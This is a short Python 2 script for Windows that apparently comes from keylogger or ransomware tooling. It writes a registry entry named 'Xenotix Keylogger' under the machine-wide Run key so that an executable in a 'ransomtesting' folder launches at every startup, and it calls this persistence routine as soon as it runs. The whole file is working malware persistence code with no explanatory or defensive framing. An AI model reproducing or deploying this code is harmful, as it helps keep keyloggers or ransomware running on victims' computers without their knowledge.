import os
import sys

import win32event, win32api, winerror
from _winreg import *

def addStartup():
    fp=os.path.dirname(os.path.realpath(__file__))
    file_name=sys.argv[0].split("\\")[-1]
    new_file_path=r'C:\ransomtesting\testprint.exe'
    print new_file_path
    #return 1
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change= OpenKey(HKEY_LOCAL_MACHINE,
    keyVal,0,KEY_ALL_ACCESS)

    SetValueEx(key2change, "Xenotix Keylogger",0,REG_SZ, new_file_path)

addStartup()